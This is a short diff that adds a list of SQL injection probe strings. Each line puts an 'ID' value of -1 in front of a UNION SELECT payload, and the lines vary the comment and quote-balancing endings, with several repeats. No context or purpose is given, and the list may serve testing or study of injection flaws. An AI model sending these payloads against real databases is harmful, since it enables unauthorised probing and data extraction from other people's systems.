@@ -1,0 +1,16 @@
+ID:-1\
+ID:-1' union select 1,2,3  -- 
+ID:-1' union select 1,2,3  and 1=1 -- 
+ID:-1' union select 1,2,3  and '1=1 -- 
+ID:-1' union select 1,2,3  and '1=1
+ID:-1' union select 1,2,3  and '1=1
+ID:-1' union select 1,2,3  and '1=1
+ID:-1' union select 1,2,3  and '1=1
+ID:-1' union select 1,2,3  and '1=1
+ID:-1' union select 1,2,3  AND '1=1
+ID:-1' union select 1,2,3  '1=1
+ID:-1' union select 1,2,3  '1
+ID:-1' union select 1,2,3  'name_of_3
+ID:-1' union select 1,2,3  'name_of_3
+ID:-1' union select 1,2,3  'name_of_3
+ID:-1' union select 1,2,3  -- 
